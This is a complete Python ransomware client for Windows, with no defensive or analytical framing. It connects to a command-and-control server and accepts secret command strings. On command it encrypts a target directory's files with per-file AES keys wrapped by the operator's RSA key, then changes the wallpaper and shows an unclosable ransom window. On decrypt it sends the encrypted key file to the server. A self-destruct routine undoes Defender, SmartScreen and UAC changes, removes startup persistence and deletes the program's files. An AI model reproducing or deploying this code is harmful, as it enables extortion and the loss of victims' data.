#!/usr/bin/python3

import socket
import time
import os.path

from Crypto.Random import get_random_bytes
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES

from pathlib import Path

# from win32api import GetSystemMetrics
from tkinter import *

# impor py7zr
import multivolumefile
import subprocess
import threading
import tempfile
import binascii
import getpass
import pathlib
import hashlib
import shutil
import winreg
import ctypes
import json
import gzip
import time
import os
import io

s = None
type_data = None
dst_path = "C:/Windows/System32/drivers/sys"
kill = None


class Client_AES_Encrypt_File:
    def __init__(self, encrypt_path, key_path, pub_key):
        self.encrypt_path = encrypt_path
        self.key_path = key_path
        self.pub_key = pub_key
        self.file_aes_map = {}

        # key_path should be in a format of (C:/Windows/etc) - Example

    def export_pub_key(self):
        with open("public_key.pem", "wb") as file:
            file.write(self.pub_key)

        with open("public_key.pem", "rb") as file:
            key = RSA.importKey(file.read())

        self.pub_key = key
        os.remove("public_key.pem")

    def aes_key_store(self, store_type):

        if store_type == 1:
            if os.path.exists(f"{self.key_path}/keys/"):
                shutil.rmtree(f"{self.key_path}/keys/")
            os.mkdir(f'{self.key_path}/keys')

            with open(f"{self.key_path}/keys/aes_keys", "w") as aes_keys:
                json.dump(self.file_aes_map, aes_keys, indent=4)
                # json.dump(self.file_aes_map, aes_keys)

            target = pathlib.Path(f'{self.key_path}/keys/aes_keys')

            # either use gzip for both server and client or just use py7zr

            # with multivolumefile.open('keys/aes_keys_archive', mode='wb', volume=450) as target_archive:
            #     with py7zr.SevenZipFile(target_archive, 'w') as archive:
            #         archive.writeall(target, 'aes_keys')

            with multivolumefile.open(f'{self.key_path}/keys/aes_keys_archive', mode='wb',
                                      volume=450) as target_archive:
                with gzip.open(target_archive, 'wb') as archive:
                    with io.TextIOWrapper(archive, encoding='utf-8') as encode:
                        data = open(target, "r").read()
                        encode.write(data)

            os.remove(f"{self.key_path}/keys/aes_keys")

        else:
            # either use shutil.make_archive("key", 'zip', "keys") & os.rename("key.zip", "key") for client or just use py7zr

            # with py7zr.SevenZipFile('key', 'w') as archive:
            #     archive.writeall("keys/")

            shutil.make_archive(f"{self.key_path}/key", 'zip', f"{self.key_path}/", "keys")
            os.rename(f"{self.key_path}/key.zip", f"{self.key_path}/key")

            shutil.rmtree(f"{self.key_path}/keys/")

    def encrypt_with_aes(self, file_path, key, IV):
        try:
            mode = AES.MODE_CBC
            cipher = AES.new(key, mode, IV)

            file = open(file_path, "rb")
            data = file.read()
            file.close()

            while len(data) % 16 != 0:
                data += b'0'

            encrypted_msg = cipher.encrypt(data)

            file = open(file_path, "wb")
            file.write(encrypted_msg)
            file.close()

            return True

        except Exception as error:
            print(error)

            return False

    def aes_generator(self):

        password = get_random_bytes(256)
        key = hashlib.sha256(password).digest()
        IV = get_random_bytes(16)

        # return key, hex_to_str(key), IV, hex_to_str(IV)
        return key, binascii.hexlify(key).decode("utf-8"), IV, binascii.hexlify(IV).decode("utf-8")

    def aes_run_encrypt(self):
        for file_path in self.file_aes_map:
            key, str_key, IV, str_IV = self.aes_generator()

            state = self.encrypt_with_aes(file_path, key, IV)
            if state:
                self.file_aes_map[file_path] = [str_key, str_IV]

    def directory_looper(self, path):
        path_d = []

        for directory in os.walk(path):
            path_d.append(directory)

        if len(path_d) == 0:
            self.file_aes_map[path_d] = None

        else:
            for loop1 in range(len(path_d)):
                path_r, direc, file = path_d[loop1]

                for all_files in file:
                    file_path = path_r + "/" + all_files
                    self.file_aes_map[file_path] = None

    def encrypt_with_rsa(self, file_path):

        file = open(file_path, "rb")
        data = file.read()
        file.close()

        encryptor = PKCS1_OAEP.new(self.pub_key)
        encrypted = encryptor.encrypt(data)

        file = open(file_path, "wb")
        file.write(encrypted)
        file.close()

    def rsa_run_encrypt(self):
        self.file_aes_map = {}
        self.directory_looper(f"{self.key_path}/keys/")

        for file in self.file_aes_map:
            self.encrypt_with_rsa(file)

    def main(self):
        self.export_pub_key()
        self.directory_looper(self.encrypt_path)
        print("[+] Encrypting Files")
        self.aes_run_encrypt()
        self.aes_key_store(1)
        print("[+] Encrypting AES Symmetric Keys")
        self.rsa_run_encrypt()
        self.aes_key_store(2)
        print("[+] Completed!!")


class Client_AES_Decrypt_File:
    def __init__(self, key_path):
        self.key_path = key_path

        # key_path should be in a format of (C:/.../aes_key) - Example

    def decrypt_with_aes(self, file_path, key, IV):
        try:
            mode = AES.MODE_CBC
            cipher = AES.new(key, mode, IV)

            file = open(file_path, "rb")
            data = file.read()
            file.close()

            decrypted_msg = cipher.decrypt(data)
            final_data = decrypted_msg.rstrip(b'0')

            file = open(file_path, "wb")
            file.write(final_data)
            file.close()

        except Exception as error:
            print(error)

            return False

    def aes_run_decrypt(self):

        def str_to_hex(key):
            new_key = b""
            for x in range(0, len(key), 4):
                x = int(key[x:x + 4], base=16)
                new_key += bytes([x >> 8, x & 0xFF])

            return new_key


        file_keys = json.load(open(self.key_path))
        for file_path in file_keys:

            if file_keys[file_path] is not None:
                aes_key = str_to_hex(file_keys[file_path][0])
                IV = str_to_hex(file_keys[file_path][-1])

                self.decrypt_with_aes(file_path, aes_key, IV)

    def main(self):
        print("[+] Decrypting Files")
        self.aes_run_decrypt()
        print("[+] Decryption Complete!!\n\nThank you for your Service. Stay Safe!!")

        os.remove(self.key_path)
        os.remove(f"{os.path.dirname(self.key_path)}/key")


def self_destruct():
    global kill

    # enable windows smartscreen
    path = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", 0,
                          winreg.KEY_WRITE)
    winreg.SetValueEx(path, "SmartScreenEnabled", 0, winreg.REG_SZ, "On")

    # enable AV in general
    subprocess.call("powershell.exe -command Remove-MpPreference -ExclusionExtension .exe", shell=True)
    subprocess.call("powershell.exe -command Remove-MpPreference -ExclusionExtension .tmp", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -EnableControlledFolderAccess Enabled", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -PUAProtection enable", shell=True)
    subprocess.call("powershell.exe -command Remove-MpPreference -ExclusionExtension .exe", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -DisableBlockAtFirstSeen $false", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -DisableIOAVProtection $false", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -DisablePrivacyMode $false", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $false",
                    shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -DisableArchiveScanning $false", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -DisableIntrusionPreventionSystem $false", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -DisableScriptScanning $false", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -SubmitSamplesConsent 1", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -MAPSReporting 1", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -HighThreatDefaultAction Block -Force", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -ModerateThreatDefaultAction Block", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -LowThreatDefaultAction Block", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -SevereThreatDefaultAction Block", shell=True)
    subprocess.call("powershell.exe -command Set-MpPreference -ScanScheduleDay 1", shell=True)
    subprocess.call("powershell.exe -command netsh advfirewall set allprofiles state on", shell=True)

    # Increase the UAC Level
    path = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0,
                          winreg.KEY_WRITE)
    winreg.SetValueEx(path, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 5)

    start_up_folder = f"{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

    try:
        os.remove(f"{start_up_folder}/driver.vbs")
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                             winreg.KEY_WRITE)
        winreg.DeleteValue(key, "WindowsDriver")
        winreg.CloseKey(key)
    except FileNotFoundError:
        pass

    try:
        subprocess.call(f'SCHTASKS /DELETE /F /TN "Microsoft\Windows\Windows Driver\Driver"')
    except:
        pass

    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{dst_path}/windows.jpg", 0)

    data = f'''@echo off
    FOR /D /R %TEMP% %%X IN (_M*) DO RMDIR /S /Q "%%X"
    goto :delete

    :delete
    Echo Please Wait...
    ping 127.0.0.1 -n 2 > NUL
    @RD /S /Q "{dst_path}"
    cls
    goto :check

    :check
    if exist "{dst_path}/driver.exe" (goto :delete) else (goto :msg)

    :msg
    echo.
    echo.
    echo --------------------Decryption Complete!!--------------------
    echo             Thank you for your Service. Stay Safe!!
    echo.
    echo.
    timeout /t -1
    DEL "%~f0"'''

    open(f"{tempfile.gettempdir()}\\self_destruct.bat", "w").write(data)
    path_bat = Path(f'{tempfile.gettempdir()}\\self_destruct.bat')

    DETACHED_PROCESS = 0x00000008
    CREATE_NEW_PROCESS_GROUP = 0x00000200

    subprocess.Popen(["start", "cmd.exe", "@cmd", "/k", f'{path_bat}'],
                     creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP, stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    kill = "die"
    time.sleep(2)


def ransom_msg():
    def do_ntg():
        pass

    def center(toplevel):
        toplevel.update_idletasks()

        # Tkinter way to find the screen resolution
        screen_width = toplevel.winfo_screenwidth()
        screen_height = toplevel.winfo_screenheight()

        # get screen resolution
        # screen_width = GetSystemMetrics(0)
        # screen_height = GetSystemMetrics(1)

        size = tuple(int(_) for _ in toplevel.geometry().split('+')[0].split('x'))
        x = screen_width / 2 - size[0] / 2
        y = screen_height / 2 - size[1] / 2

        toplevel.geometry("+%d+%d" % (x, y))
        toplevel.title("Centered!")

    # Changing Desktop Image
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{dst_path}/original.jpg", 0)
    print("[+] Changed Desktop Image")

    # Create object
    root = Tk()

    # Adjust size
    root.geometry("1920x1080")
    root.minsize(1386, 636)
    root.maxsize(1389, 636)

    # place window in middle of screen
    center(root)

    # prevents the windows from closing
    root.protocol('WM_DELETE_WINDOW', do_ntg)

    # prevents the application been closed by alt + F4
    root.overrideredirect(True)

    # Add image file
    bg = PhotoImage(file=f"{dst_path}/ransom.png")

    # Create Canvas
    canvas1 = Canvas(root, width=400, height=400, cursor="spider")
    canvas1.pack(fill="both", expand=True)

    # Display image
    canvas1.create_image(0, 0, image=bg, anchor="nw")

    print("[+] Showing Ransom App")

    # Execute tkinter
    root.mainloop()


def pre_check():
    def resource_path():
        """ Get absolute path to resource, works for dev and for PyInstaller """
        try:
            # PyInstaller creates a temp folder and stores path in _MEIPASS
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")

        return base_path

    if not (os.path.isfile(f"{dst_path}/windows.jpg") and os.path.isfile(f"{dst_path}/ransom.png") and os.path.isfile(
            f"{dst_path}/original.jpg")):
        print("[+] Extracting Image Files..")

        src_path = resource_path()
        # dst_path = pathlib.Path(__file__).parent.resolve()
        # dst_path = pathlib.Path().resolve()

        shutil.move(f'{src_path}\\original.jpg', f'{dst_path}/original.jpg')
        shutil.move(f'{src_path}\\windows.jpg', f'{dst_path}/windows.jpg')
        shutil.move(f'{src_path}\\ransom.png', f'{dst_path}/ransom.png')

        DETACHED_PROCESS = 0x00000008
        CREATE_NEW_PROCESS_GROUP = 0x00000200

        subprocess.Popen(["CACLS", f"{dst_path}\*", "/E", "/P", f"{getpass.getuser()}:F"],
                         creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP, stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE, stdin=subprocess.PIPE)


def temp_define(string):
    if string == "encrypted":
        open(f"{dst_path}/encrypt_done", "w").close()
        subprocess.call(f'CACLS {dst_path}\* /E /P {getpass.getuser()}:F')
        p3 = threading.Thread(target=ransom_msg)
        p3.start()

    elif string == "decrypted":
        os.remove(f"{dst_path}/encrypt_done")

    return os.path.isfile(f"{dst_path}/encrypt_done")


def decider(data):
    global type_data

    # Use to check file/directory if exists
    if data == "D@nC1nGM0nK3yPATHdjShankeyShoe" or type_data == "file":
        if type_data == "file":
            result = os.path.exists(data)
            if result:
                output = b"Exists"
            else:
                output = b"Error"
            type_data = None
            return output
        else:
            type_data = "file"

    # Encryption
    elif data == "B!GP0ndENCRYPTsmallFishZY" or type_data == "public_key":
        if type_data == "public_key":
            # Split the key and the path
            key = data.split("@@Encrypt@@")[0].encode("utf-8")
            path = data.split("@@Encrypt@@")[-1]

            # Encrypts the data
            Client_AES_Encrypt_File(path, dst_path, key).main()
            temp_define("encrypted")
            type_data = None

        else:
            type_data = "public_key"

    # Decryption
    elif data == "y3sD@DDyDECRYPTBigPaPaYJ" or type_data == "private_key":
        file = open(f"{dst_path}/key", "rb")
        filesend = file.read()
        file.close()

        print("[+] Sending Encrypted Key file")
        s.send(filesend)

        time.sleep(0.5)
        s.send(b'l9R0260myxF0vU19ugRCnkIbtj8X0bamDmw8crq4CTC5AlkIa4RZidKKtGJzB3W8mDD0xN')

        data = b''
        while True:
            reply = s.recv(9999)
            if reply == b'l9R0260myxF0vU19ugRCnkIbtj8X0bamDmw8crq4CTC5AlkIa4RZidKKtGJzB3W8mDD0xN':
                break
            else:
                data += reply

        print("[+] Received Decrypted Key file")
        file = open(f'{dst_path}/aes_keys', 'wb')
        file.write(data)
        file.close()

        Client_AES_Decrypt_File(f"{dst_path}/aes_keys").main()
        temp_define("decrypted")

        print("[+] Initiating Self-Destruct")
        self_destruct()

    # beacon
    elif data == "beacon":
        return b'alive'


def socketing():
    global s
    port = 9100
    ip = "192.168.10.1"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    error = True

    print("[+] Attempting Connection")

    while error:
        try:
            s.connect((ip, port))
            error = False
        except:
            time.sleep(3)
    try:
        while True:
            type = s.recv(9999)
            type = type.decode("utf-8")
            output = decider(type)

            # Send back the output message
            if output != None:
                s.send(output)

            if type == b'End':
                s.close()
                print("[+] Exiting")
                exit()

    except:
        socketing()


def run_check():
    command = 'tasklist /FI "IMAGENAME eq driver.exe"'
    cmd = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = cmd.communicate()
    if stdout.decode().count('\n') > 5:
        return False
    else:
        return True


if run_check():

    print("[+] Running...")
    pre_check()
    print("[+] Completed Pre Check")

    p1 = threading.Thread(target=socketing, daemon=True)
    p1.start()
    print("[+] Started Socket Thread")

    if temp_define(None):
        print("[+] Started Ransom Message Thread")
        p2 = threading.Thread(target=ransom_msg, daemon=True)
        p2.start()

    while True:
        time.sleep(1)
        if kill == "die":
            break
